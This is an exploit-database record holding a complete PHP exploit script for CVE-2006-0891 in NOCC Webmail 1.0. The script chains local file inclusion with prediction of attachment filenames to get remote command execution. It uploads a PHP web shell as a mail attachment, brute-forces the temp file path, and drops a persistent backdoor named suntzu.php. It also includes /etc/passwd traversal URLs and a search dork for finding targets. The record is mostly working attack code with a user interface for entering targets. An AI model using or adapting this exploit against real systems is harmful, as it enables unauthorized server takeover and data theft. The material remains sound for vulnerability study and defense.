{
  "id": "1522",
  "title": "NOCC Webmail 1.0 - Local File Inclusion / Remote Code Execution",
  "cve": "CVE-2006-0891",
  "vuln_type": "rce",
  "code": "<?php\r\n#  ---noccw_10_incl_xpl.php                                 8.22 23/02/2006    #\r\n#                                                                              #\r\n#  NOCC Webmail <= 1.0 remote commands execution exploit through arbitrary     #\r\n#  local inclusion & attachment filename prediction                            #\r\n#                                                                              #\r\n#                              coded by rgod                                   #\r\n#                     site: http://retrogod.altervista.org                     #\r\n#                                                                              #\r\n# -> works regardless of any magic_quotes_gpc settings                         #\r\n#                                                                              #\r\n# dork: (\"powered by nocc\" intitle:\"NOCC Webmail\") -site:sourceforge.net       #\r\n# -Zoekinalles.nl -analysis                                                    #\r\n#                                                                              #\r\n# Sun-Tzu: \"Knowing the place and the time of the coming  battle, we may       #\r\n# concentrate from the greatest distances in order to fight\"                   #\r\n\r\n/* short explaination:\r\n   we have various arbitrary local inclusion issues, ex:\r\n\r\n   http://[tArGeT]/[pAtH]/index.php?lang=../../../../../../../../../../../../etc/passwd%00\r\n   http://[tArGeT]/[pAtH]/index.php?theme=../../../../../../../../../../../etc/passwd%00\r\n   http://[tArGeT]/[pAtH]/html/footer.php?_SESSION[nocc_theme]=../../../../../../../../etc/passwd%00\r\n\r\n   This code upload an evil mail attachment (file is renamed by NOCC...).\r\n   After, it tries to include it, predicting its name and its location, ex:\r\n\r\n   http://[tArGeT]/[pAtH]/index.php?lang=../tmp/php354.tmp1140521343.att%00&cmd=ls%20-la\r\n   http://[tArGeT]/[pAtH]/index.php?theme=../tmp/php354.tmp1140521343.att%00&cmd=ls%20-la\r\n   http://[tArGeT]/[pAtH]/html/footer.php?_SESSION[nocc_theme]=..%2f..%2Ftmp%2Fphp53.tmp1140662880.att%00\r\n\r\n   If succeeded, it installs  a backdoor called suntzu.php on target server.\r\n\r\n   To launch this exploit you need a POP3 account on a machine of your choice,\r\n   you need to supply servername, username & password.\r\n\r\n   a note:\r\n   you can do the same manually and more quickly with profile files, if\r\n   enabled, ex:\r\n   edit your profile, then:\r\n\r\n   http://[target]/[path]/index.php?cmd=cat%20conf.php&lang=../profiles/username@somehost.com.pref%00\r\n\r\n   see the full advisory here: http://retrogod.altervista.org/noccw_10_incl_xpl.html\r\n                                                                              */\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",10);\r\nob_implicit_flush (1);\r\n\r\necho'<html><head><title> **** NOCC Webmail <= 1.0 remote commands execution ****\r\n</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<style type=\"text/css\"> body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:\r\n#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img\r\n{background-color:   #FFFFFF   !important}  input  {background-color:    #303030\r\n!important} option {  background-color:   #303030   !important}         textarea\r\n{background-color: #303030 !important} input {color: #1CB081 !important}  option\r\n{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox\r\n{background-color: #303030 !important} select {font-weight: normal;       color:\r\n#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;\r\nbackground-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:\r\n0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em\r\n!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em\r\n!important} \th2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em\r\n!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:\r\nnormal !important} *{text-decoration: none !important} a:link,a:active,a:visited\r\n{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;\r\ncolor : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;\r\nfont-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;\r\nfont-weight:bold; font-style: italic;}--></style></head><body><p class=\"Stile6\">\r\n **** NOCC Webmail <= 1.0 remote commands execution ****</p><p class=\"Stile6\">a\r\nscript  by  rgod  at    <a href=\"http://retrogod.altervista.org\"target=\"_blank\">\r\nhttp://retrogod.altervista.org</a> </p> <table  width=\"84%\"><tr><td width=\"43%\">\r\n<form name=\"form1\" method=\"post\" action=\"'.$_SERVER[PHP_SELF].'\">    <p><input\r\ntype=\"text\"  name=\"hOsT\"> <span class=\"Stile5\">* tArGeT    (ex:www.sitename.com)\r\n</span></p> <p><input type=\"text\" name=\"pAtH\">  <span class=\"Stile5\">* pAtH (ex:\r\n/nocc/ or just / )  </span> </p> <p> <input type=\"text\"  name=\"cmd\">       <span\r\nclass=\"Stile5\"> * specify a command   </span> </p>  <p>      <input  type=\"text\"\r\nname=\"POP3_SERVER\"><span class=\"Stile5\"> * a POP3 server  </span> </p> <p><input\r\ntype=\"text\" name=\"USER\"><span class=\"Stile5\"> * USERNAME ...</span></p><p><input\r\ntype=\"password\"   name=\"PASSWD\"> <span  class=\"Stile5\"> * ... and PASSWORD to it\r\n</span></p><p><input type=\"text\" name=\"PorT\"><span class=\"Stile5\">specify a PorT\r\nother than  80 (default value)</span> </p> <p> <input  type=\"text\" name=\"pRoXy\">\r\n<span class=\"Stile5\"> send  exploit through an HTTP pRoXy (ip:PorT) </span> </p>\r\n<p><input type=\"submit\" name=\"Submit\" value=\"go!\"></p></form></td></tr> </table>\r\n</body></html>';\r\n\r\nfunction show($headeri)\r\n{\r\n  $ii=0;$ji=0;$ki=0;$ci=0;\r\n  echo '<table border=\"0\"><tr>';\r\n  while ($ii <= strlen($headeri)-1){\r\n    $dAtAi=dechex(ord($headeri[$ii]));\r\n    if ($ji==16) {\r\n      $ji=0;\r\n      $ci++;\r\n      echo \"<td>&nbsp;&nbsp;</td>\";\r\n      for ($li=0; $li<=15; $li++) {\r\n        echo \"<td>\".htmlentities($headeri[$li+$ki]).\"</td>\";\r\n\t\t}\r\n      $ki=$ki+16;\r\n      echo \"</tr><tr>\";\r\n    }\r\n    if (strlen($dAtAi)==1) {\r\n      echo \"<td>0\".htmlentities($dAtAi).\"</td>\";\r\n    }\r\n    else {\r\n      echo \"<td>\".htmlentities($dAtAi).\"</td> \";\r\n    }\r\n    $ii++;$ji++;\r\n  }\r\n  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {\r\n    echo \"<td>&nbsp&nbsp</td>\";\r\n  }\r\n  for ($li=$ci*16; $li<=strlen($headeri); $li++) {\r\n    echo \"<td>\".htmlentities($headeri[$li]).\"</td>\";\r\n  }\r\n  echo \"</tr></table>\";\r\n}\r\n\r\n$pRoXy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nfunction sendpAcKeT() //2x speed\r\n{\r\n  global $pRoXy, $hOsT, $PorT, $pAcKeT, $HtMl, $pRoXy_regex;\r\n  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\r\n  if ($socket < 0) {\r\n    echo \"socket_create() failed: reason: \" . socket_strerror($socket) . \"<br>\";\r\n  }\r\n  else {\r\n    $c = preg_match($pRoXy_regex,$pRoXy);\r\n    if (!$c) {echo 'Not a valid proxy...';\r\n    die;\r\n    }\r\n  echo \"OK.<br>\";\r\n  echo \"Attempting to connect to \".$hOsT.\" on PorT \".$PorT.\"...<br>\";\r\n  if ($pRoXy=='') {\r\n    $result = socket_connect($socket, $hOsT, $PorT);\r\n  }\r\n  else {\r\n    $parts =explode(':',$pRoXy);\r\n    echo 'Connecting to '.$parts[0].':'.$parts[1].' pRoXy...<br>';\r\n    $result = socket_connect($socket, $parts[0],$parts[1]);\r\n  }\r\n  if ($result < 0) {\r\n    echo \"socket_connect() failed.\\r\\nReason: (\".$result.\") \" . socket_strerror($result) . \"<br><br>\";\r\n  }\r\n  else {\r\n    echo \"OK.<br><br>\";\r\n    $HtMl= '';\r\n    socket_write($socket, $pAcKeT, strlen($pAcKeT));\r\n    echo \"Reading response:<br>\";\r\n    while ($out= socket_read($socket, 2048)) {$HtMl.=$out;}\r\n    echo nl2br(htmlentities($HtMl));\r\n    echo \"Closing socket...\";\r\n    socket_close($socket);\r\n  }\r\n  }\r\n}\r\n\r\nfunction sendpAcKeTii($pAcKeT)\r\n{\r\n  global $pRoXy, $hOsT, $PorT, $HtMl, $pRoXy_regex;\r\n  if ($pRoXy=='') {\r\n    $ock=fsockopen(gethOsTbyname($hOsT),$PorT);\r\n    if (!$ock) {\r\n      echo 'No response from '.htmlentities($hOsT); die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($pRoXy_regex,$pRoXy);\r\n    if (!$c) {\r\n      echo 'Not a valid pRoXy...';die;\r\n    }\r\n    $parts=explode(':',$pRoXy);\r\n    echo 'Connecting to '.$parts[0].':'.$parts[1].' pRoXy...<br>';\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from pRoXy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$pAcKeT);\r\n  if ($pRoXy=='') {\r\n    $HtMl='';\r\n    while (!feof($ock)) {\r\n      $HtMl.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $HtMl='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$HtMl))) {\r\n      $HtMl.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n  // echo nl2br(htmlentities($HtMl));\r\n}\r\n\r\nfunction greenwich_timestamp($HtMl)\r\n{\r\n   $temp=explode(\"Date: \",$HtMl);\r\n   $temp2=explode(\"\\r\\n\",$temp[1]);\r\n   $is_now=$temp2[0];\r\n   $temp=explode(\" \",$is_now);$day=$temp[1];$month=$temp[2];$year=$temp[3];$temp2=explode(\":\",$temp[4]);\r\n   $hour=$temp2[0];$min=$temp2[1];$sec=$temp2[2];\r\n   $tb=array ('Jan', '1','Feb', '2','Mar', '3','Apr', '4','May', '5','Jun', '6',\r\n   'Jul', '7','Aug', '8','Sep', '9','Oct', '10','Nov', '11','Dec', '12');\r\n   for ($i=0;$i<=23;$i++) {if ($month==$tb[$i]) {$month=$tb[$i+1];break;}}\r\n   return mktime($hour,$min,$sec,$month,$day,$year);\r\n}\r\n\r\nif ( get_magic_quotes_gpc() ) {\r\n   function stripslashes_deep($value) {\r\n       $value = is_array($value) ? array_map('stripslashes_deep', $value) : stripslashes($value);\r\n       return $value;\r\n   }\r\n   $_POST = stripslashes_deep($_POST);\r\n}\r\n\r\n$hOsT=$_POST[hOsT];$pAtH=$_POST[pAtH];$PorT=$_POST[PorT];\r\n$USER=$_POST[USER];$PASSWD=$_POST[PASSWD];$POP3_SERVER=$_POST[POP3_SERVER];\r\n$cmd=$_POST[cmd];\r\necho \"<span class=\\\"Stile5\\\">\";\r\nif (($hOsT<>'') and ($pAtH<>'') and ($cmd<>''))\r\n{\r\n  $PorT=intval(trim($PorT));\r\n  if ($PorT=='') {$PorT=80;}\r\n  if (($pAtH[0]<>'/') or ($pAtH[strlen($pAtH)-1]<>'/')) {echo 'Error... check the pAtH!'; die;}\r\n  if ($pRoXy=='') {$p=$pAtH;} else {$p='http://'.$hOsT.':'.$PorT.$pAtH;}\r\n  $hOsT=str_replace(\"\\r\",\"\",$hOsT);$hOsT=str_replace(\"\\n\",\"\",$hOsT);\r\n  $pAtH=str_replace(\"\\r\",\"\",$pAtH);$pAtH=str_replace(\"\\n\",\"\",$pAtH);\r\n\r\n#STEP 0 -> Check if already succeeded on tArGeT hOsT...\r\n$subpAtH= array ('','html/');\r\nfor ($i=0; $i<=count($subpAtH)-1; $i++)\r\n{\r\n  $pAcKeT =\"GET \".$p.$subpAtH[$i].\"suntzu.php?cmd=\".urlencode($cmd).\" HTTP/1.1\\r\\n\";\r\n  $pAcKeT.=\"Host: \".$hOsT.\"\\r\\n\";\r\n  $pAcKeT.=\"Connection: Close\\r\\n\\r\\n\";\r\n  show($pAcKeT);\r\n  sendpAcKeTii($pAcKeT);\r\n  if (eregi(\"Hi Master!\",$HtMl)) {echo nl2br(htmlentities($HtMl));\r\n                                  die(\"Exploit succeeded...\");}\r\n}\r\nif (file_exists($hOsT.\".txt\"))\r\n  {\r\n   $f=fopen($hOsT.\".txt\",\"r\");\r\n   $XpL=fgets($f);\r\n   fclose($f);\r\n   $pAcKeT =\"GET \".$p.$XpL.\"&cmd=\".urlencode($cmd).\" HTTP/1.1\\r\\n\";\r\n   $pAcKeT.=\"hOsT: \".$hOsT.\"\\r\\n\";\r\n   $pAcKeT.=\"Connection: Close\\r\\n\\r\\n\";\r\n   show($pAcKeT);\r\n   sendpAcKeTii($pAcKeT);\r\n   if (eregi(\"Hi Master!\",$HtMl)) {echo nl2br(htmlentities($HtMl));\r\n                                   die(\"Exploit succeeded...\");}\r\n}\r\n}\r\n\r\nif (($hOsT<>'') and ($pAtH<>'') and ($cmd<>'') and ($POP3_SERVER<>'') and ($USER<>'') and ($PASSWD<>''))\r\n{\r\n$difftime=0;\r\n//syncrhonize with remote tArGeT Unin epoch time by Apache \"Date:\" response header\r\n//it carries GMT time... sending two HEAD requests, one to target, one to yourself\r\nif (eregi(\"Date: \",$HtMl))\r\n{\r\n        $pAcKeT =\"HEAD / HTTP/1.1\\r\\nhOsT: \".$hOsT.\"\\r\\nConnection: Close\\r\\n\\r\\n\";\r\n        sendpAcKeTii($pAcKeT);\r\n        $itstime=greenwich_timestamp($HtMl);\r\n        echo \"tArGeT hOsT greenwich timestamp: \".$itstime.\"<br>\";\r\n        $pAcKeT=str_replace($hOsT,$_SERVER[SERVER_NAME],$pAcKeT);\r\n        $fp=fsockopen($_SERVER[SERVER_NAME],$_SERVER[SERVER_PORT]);\r\n        fputs($fp,$pAcKeT);$out='';\r\n        while (!feof($fp)){\r\n          $out.=fgets($fp);\r\n        }\r\n        fclose($fp);\r\n        $mytime=greenwich_timestamp($out);\r\n        echo \"my greenwich timestamp: \".$mytime.\"<br>\";\r\n        $difftime= $itstime-$mytime;\r\n        echo \"difftime: \".$difftime.\"<br>\";\r\n}\r\n  #STEP 1 -> Login to a POP3 server that you choose to have access on NOCC interface\r\n  $dAtA =\"user=\".$USER;\r\n  $dAtA.=\"&domainnum=0\";\r\n  $dAtA.=\"&passwd=\".$PASSWD;\r\n  $dAtA.=\"&server=\".$POP3_SERVER;\r\n  $dAtA.=\"&port=110\";\r\n  $dAtA.=\"&servtype=pop3\";\r\n  $dAtA.=\"&lang=en\";\r\n  $dAtA.=\"&theme=standard\";\r\n  $dAtA.=\"&enter=Ok\";\r\n  $pAcKeT =\"POST \".$p.\"action.php HTTP/1.1\\r\\n\";\r\n  $pAcKeT.=\"Referer: http://\".$hOsT.$pAtH.\"\\r\\n\";\r\n  $pAcKeT.=\"Accept-Language: en\\r\\n\";\r\n  $pAcKeT.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n  $pAcKeT.=\"User-Agent: Sun-Tzu\\r\\n\";\r\n  $pAcKeT.=\"Host: \".$hOsT.\"\\r\\n\";\r\n  $pAcKeT.=\"Content-Length: \".strlen($dAtA).\"\\r\\n\";\r\n  $pAcKeT.=\"Connection: Close\\r\\n\";\r\n  $pAcKeT.=\"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n  $pAcKeT.=$dAtA;\r\n  show($pAcKeT);\r\n  sendpAcKeTii($pAcKeT);\r\n  $temp=explode(\"Set-Cookie: \",$HtMl);\r\n  $temp2=explode(\" \",$temp[1]);\r\n  $COOKIE=$temp2[0];\r\n  $temp2=explode(\" \",$temp[2]);\r\n  $COOKIE.=\" \".$temp2[0];\r\n  echo \"COOKIE -> \".htmlentities($COOKIE).\"<BR>\";\r\n\r\n#STEP 2 -> Upload the evil attachment...\r\n$action = array ('add', 'Attach'); //'action' name is different in some versions\r\n$found=0;\r\nfor ($d=0; $d=count($action)-1; $d++)\r\n{\r\n$dAtA='-----------------------------7d630bc80618\r\nContent-Disposition: form-data; name=\"sort\"\r\n\r\n1\r\n-----------------------------7d630bc80618\r\nContent-Disposition: form-data; name=\"sortdir\"\r\n\r\n1\r\n-----------------------------7d630bc80618\r\nContent-Disposition: form-data; name=\"lang\"\r\n\r\nen\r\n-----------------------------7d630bc80618\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nwrite\r\n-----------------------------7d630bc80618\r\nContent-Disposition: form-data; name=\"sendaction\"\r\n\r\n'.$action[$d].'\r\n-----------------------------7d630bc80618\r\nContent-Disposition: form-data; name=\"num_attach\"\r\n\r\n0\r\n-----------------------------7d630bc80618\r\nContent-Disposition: form-data; name=\"mail_from\"\r\n\r\nfake@fakemail.com\r\n-----------------------------7d630bc80618\r\nContent-Disposition: form-data; name=\"mail_to\"\r\n\r\n\r\n-----------------------------7d630bc80618\r\nContent-Disposition: form-data; name=\"mail_cc\"\r\n\r\n\r\n-----------------------------7d630bc80618\r\nContent-Disposition: form-data; name=\"mail_bcc\"\r\n\r\n\r\n-----------------------------7d630bc80618\r\nContent-Disposition: form-data; name=\"mail_subject\"\r\n\r\n\r\n-----------------------------7d630bc80618\r\nContent-Disposition: form-data; name=\"mail_att\"; filename=\"C:\\suntzuuuu.php\"\r\nContent-Type: text/html\r\n\r\n<?php\r\nob_clean();echo\"Hi Master!\";ini_set(\"max_execution_time\",0);passthru($_GET[cmd]);\r\n$sun=fopen(\"suntzu.php\",\"w\");fputs($sun,\"<?php ob_clean();echo\\\"Hi Master!\\\";ini_set(\\\"max_execution_time\\\",0);passthru(\\$_GET[cmd]);\");\r\nfclose($sun);chmod(\"suntzu.php\",777);\r\ndie;\r\n?>\r\n-----------------------------7d630bc80618\r\nContent-Disposition: form-data; name=\"priority\"\r\n\r\n3 (Normal)\r\n-----------------------------7d630bc80618\r\nContent-Disposition: form-data; name=\"mail_body\"\r\n\r\n\r\n-----------------------------7d630bc80618--';\r\n\r\n  $pAcKeT =\"POST \".$p.\"send.php HTTP/1.1\\r\\n\";\r\n  $pAcKeT.=\"Referer: http://\".$hOsT.$pAtH.\"action.php?action=write&lang=en&sort=1&sortdir=1\\r\\n\";\r\n  $pAcKeT.=\"Accept-Language: en\\r\\n\";\r\n  $pAcKeT.=\"Content-Type: multipart/form-data; boundary=---------------------------7d630bc80618\\r\\n\";\r\n  $pAcKeT.=\"User-Agent: Sun-Tzu\\r\\n\";\r\n  $pAcKeT.=\"Host: \".$hOsT.\"\\r\\n\";\r\n  $pAcKeT.=\"Content-Length: \".strlen($dAtA).\"\\r\\n\";\r\n  $pAcKeT.=\"Connection: Close\\r\\n\";\r\n  $pAcKeT.=\"Cache-Control: no-cache\\r\\n\";\r\n  $pAcKeT.=\"Cookie: \".$COOKIE.\"\\r\\n\\r\\n\";\r\n  $pAcKeT.=$dAtA;\r\n  show($pAcKeT);\r\n  $mytime=time()+$difftime;\r\n\r\n  echo \"predicting Unix epoch time on remote machine ->\".$mytime.\"<br><br>\";\r\n  sendpAcKeTii($pAcKeT);\r\n\r\n  if (eregi(\"suntzuuuu.php\",$HtMl)) {$found=1; break;}\r\n}\r\nif ($found==0)\r\n{die(\"Failed to upload the attachment, maybe wrong pop3 details\");}\r\n\r\n# STEP 3 Our routine... cycling to find the evil attachment and to launch commands...\r\n# ---------------------------------START----------------------------------------\r\n  //guessing where $tmpdir can be..., add some values here if you want\r\n  $tempdir= array (\r\n                  'tmp/',\r\n                  '../../../../../../../../../../../../../tmp/',\r\n\t\t          '../../../../../../../../../../../../../temp/',\r\n                  '',\r\n\t\t          'temp/',\r\n\t\t          '../tmp/',\r\n\t\t          '../../tmp/',\r\n\t\t          '../../../tmp/',\r\n\t\t          '../../../../tmp/',\r\n\t\t          '../../../../../tmp/',\r\n\t\t          '../../../../../../tmp/',\r\n\t\t          '../../../../../../../tmp/'\r\n\t\t          );\r\n  //predicting time() substring in attachment filename\r\n  $predict_time=\r\n            array (\r\n\t          $mytime,\r\n\t          $mytime + 1,\r\n\t          $mytime + 2,\r\n\t          $mytime + 3\r\n\t          );\r\n\r\nfunction refresh()\r\n{\r\n  flush();\r\n  ob_flush();\r\n  usleep(10000);\r\n}\r\n$script= array (\r\n                \"index.php?lang=\",\r\n                \"index.php?theme=\",\r\n                \"html/footer.php?_SESSION[nocc_theme]=..%2F\"\r\n               );\r\n\r\nfor ($y=1; $y<=65535; $y++) //some hex values in php temporary files\r\n{\r\n  $a_value=strtoupper(dechex($y));\r\n  for ($x=0; $x<=count($tempdir)-1; $x++) //for each possible file location\r\n  {\r\n    for ($z=0; $z<=count($predict_time) - 1; $z++) // for actual Unix epoch time, with +1,+2,+3\r\n    {\r\n      for($ww=0; $ww<=count($script)-1; $ww++) //for each vulnerable script\r\n      {\r\n      $XpL=\"../\".$tempdir[$x].\"php\".$a_value.\".tmp\".$predict_time[$z].\".att\".chr(0x00);\r\n      $XpL=urlencode($XpL);\r\n      $XpL=$script[$ww].$XpL;\r\n      $pAcKeT =\"GET \".$p.$XpL.\"&cmd=\".urlencode($cmd).\" HTTP/1.1\\r\\n\";\r\n      $pAcKeT.=\"Host: \".$hOsT.\"\\r\\n\";\r\n      $pAcKeT.=\"Connection: Close\\r\\n\\r\\n\";\r\n      echo \"trying with http://\".$hOsT.$pAtH.$XpL.\"<br>\"; refresh();\r\n      //show($pAcKeT);\r\n      sendpAcKeTii($pAcKeT);\r\n      if (eregi(\"Hi Master!\",$HtMl))\r\n               { show($pAcKeT);\r\n                 echo nl2br(htmlentities($HtMl));\r\n\t\t $f=fopen($hOsT.\".txt\",\"w\");\r\n\t\t fputs($f,$XpL);\r\n\t\t fclose($f);\r\n\t\t refresh();\r\n         die(\"Exploit succeded... We tried to put a backdoor on tArGeT system, ************ <br>\r\n\t\t      call this url:                                                                <br>\r\n\t\t      http://\".htmlentities($hOsT.$pAtH).\"suntzu.php?&cmd=[your command]            <br>\r\n\t\t      or this:                                                                      <br>\r\n\t\t      http://\".htmlentities($hOsT.$pAtH).\"html/suntzu.php?&cmd=[your command]       <br>\r\n\t\t      however,if not succeeded, you can launch commands with this:                  <br>\r\n\t\t      http://\".htmlentities($hOsT.$pAtH.$XpL).\"&cmd=[your command]                  <br>\r\n\t\t      Also, we keep exploit url in \".htmlentities($hOsT).\".txt, so you have not to  <br>\r\n\t\t      cycle anymore...                                                              <br>\r\n\t\t      Enjoy! ***********************************************************************<br>\r\n\t\t     \");\r\n              }\r\n\t  }\r\n    }\r\n  }\r\n}\r\n//If you are here...\r\necho \"Exploit failed...\";\r\n#-------------------------------END---------------------------------------------\r\n}\r\nelse\r\n{echo \"Fill * required fields, optionally specify a pRoXy...\";}\r\n?>\r\n\r\n# milw0rm.com [2006-02-23]",
  "url": "https://www.exploit-db.com/exploits/1522"
}